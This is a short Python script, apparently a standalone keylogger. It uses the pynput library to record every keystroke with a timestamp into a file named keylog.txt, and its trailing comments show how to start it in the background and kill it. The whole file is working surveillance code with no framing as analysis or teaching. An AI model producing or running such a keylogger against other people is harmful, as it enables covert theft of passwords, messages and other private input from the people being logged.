from pynput.keyboard import Listener
import logging

logging.basicConfig(filename=('keylog.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def onPress(_key):
	logging.info(str(_key))

with Listener(on_press=onPress) as listener:
	listener.join()

# python3 key.logger.py &
#  kill -9 <thread id> &
